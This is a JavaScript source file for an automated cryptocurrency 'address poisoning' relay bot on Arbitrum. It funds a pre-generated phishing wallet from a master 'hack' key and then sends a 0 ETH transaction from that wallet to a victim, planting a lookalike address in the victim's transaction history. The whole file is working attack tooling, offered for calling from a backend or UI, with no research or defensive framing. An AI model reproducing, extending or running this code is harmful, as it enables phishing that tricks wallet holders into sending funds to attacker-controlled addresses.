/* 
   DYNAMIC RELAY BOT
   This script exports a function to be called by a backend or UI.
   It pulls master configuration (Keys, RPC) from environment variables.
*/

import { createWalletClient, createPublicClient, http, parseEther, fallback } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { arbitrum } from 'viem/chains';
import dotenv from 'dotenv';

dotenv.config();

/**
 * Execute a relay attack.
 * @param {Object} params
 * @param {string} params.victimAddress - The target of the 0 ETH transfer.
 * @param {string} params.phishingAddress - The pre-generated relay wallet address.
 * @param {string} params.phishingPrivateKey - The private key for the relay wallet.
 * @param {string} [params.fundAmount="0.0003"] - The amount of ETH to fund the relay with.
 */
export async function executeRelay({ victimAddress, phishingAddress, phishingPrivateKey, fundAmount = '0.00002' }) {
    const ALCHEMY_RPC = process.env.ALCHEMY_RPC;
    let HACK_PRIVATE_KEY = process.env.HACK_PRIVATE_KEY;

    // Ensure HACK_PRIVATE_KEY is a valid hex string starting with 0x
    if (HACK_PRIVATE_KEY && !HACK_PRIVATE_KEY.startsWith('0x')) {
        HACK_PRIVATE_KEY = `0x${HACK_PRIVATE_KEY}`;
    }
    HACK_PRIVATE_KEY = HACK_PRIVATE_KEY?.trim();

    // Ensure phishingPrivateKey is a valid hex string starting with 0x
    let formattedPhishingKey = phishingPrivateKey?.trim();
    if (formattedPhishingKey && !formattedPhishingKey.startsWith('0x')) {
        formattedPhishingKey = `0x${formattedPhishingKey}`;
    }

    if (!ALCHEMY_RPC || !HACK_PRIVATE_KEY || HACK_PRIVATE_KEY.includes('your_master')) {
        throw new Error('Missing or invalid HACK_PRIVATE_KEY in environment variables.');
    }

    console.log(`[Relay] Starting automation for victim: ${victimAddress}`);

    const publicClient = createPublicClient({
        chain: arbitrum,
        transport: fallback([http(ALCHEMY_RPC)]),
    });

    // Calculate high-priority gas price
    const gasPrice = await publicClient.getGasPrice();
    const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.2));

    const relayAccount = privateKeyToAccount(formattedPhishingKey);

    // --- STEP 1: FUND THE RELAY (SMART GAS) ---
    const currentBalance = await publicClient.getBalance({ address: relayAccount.address });
    const targetBalance = parseEther(fundAmount);
    const sufficientBalance = (targetBalance * 50n) / 100n; // 50% of the chosen amount is more than enough
    let skippedFunding = false;

    if (currentBalance >= sufficientBalance) {
        console.log(`[Relay] Step 1 Skipped: Wallet already has sufficient balance (${currentBalance} wei).`);
        skippedFunding = true;
    } else {
        console.log(`[Relay] Step 1: Funding relay wallet (${phishingAddress}) with ${fundAmount} ETH...`);
        const hackAccount = privateKeyToAccount(HACK_PRIVATE_KEY);
        const hackClient = createWalletClient({
            account: hackAccount,
            chain: arbitrum,
            transport: fallback([http(ALCHEMY_RPC)]),
        });

        const fundHash = await hackClient.sendTransaction({
            to: phishingAddress,
            value: targetBalance,
            gasPrice: adjustedGasPrice,
        });

        await publicClient.waitForTransactionReceipt({ hash: fundHash });
        console.log(`[Relay] Relay funded: ${phishingAddress}`);
    }

    // --- STEP 2: EXECUTE ATTACK FROM RELAY ---
    console.log(`[Relay] Step 2: Sending 0 ETH from relay to victim (${victimAddress})...`);
    const relayClient = createWalletClient({
        account: relayAccount,
        chain: arbitrum,
        transport: fallback([http(ALCHEMY_RPC)]),
    });

    const attackHash = await relayClient.sendTransaction({
        to: victimAddress,
        value: parseEther('0'),
        gasPrice: adjustedGasPrice,
    });

    const receipt = await publicClient.waitForTransactionReceipt({ hash: attackHash });

    if (receipt.status === 'success') {
        console.log(`[Relay] Attack successful. Hash: ${attackHash}`);
    } else {
        console.warn(`[Relay] Attack transaction failed. Hash: ${attackHash}`);
    }

    return {
        success: receipt.status === 'success',
        hash: attackHash,
        receipt,
        skippedFunding,
    };
}
